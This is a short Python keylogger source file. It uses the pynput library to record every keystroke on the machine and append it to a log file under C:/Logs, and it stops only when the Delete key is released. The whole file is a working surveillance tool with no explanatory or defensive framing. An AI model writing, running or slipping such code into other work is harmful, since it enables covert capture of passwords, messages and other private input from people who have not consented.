import getpass
import os
from pynput.keyboard import Key, Listener
count = 0
keys = []
user = str(getpass.getuser())
if not os.path.exists('C:/Logs'):
    os.mkdir('C:/Logs')


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("C:/Logs/LOG.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 1:
                f.write('\n')
            elif k.find("shift") > 1:
                f.write(' SHIFT ')
            elif k.find("enter") > 1:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.delete:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
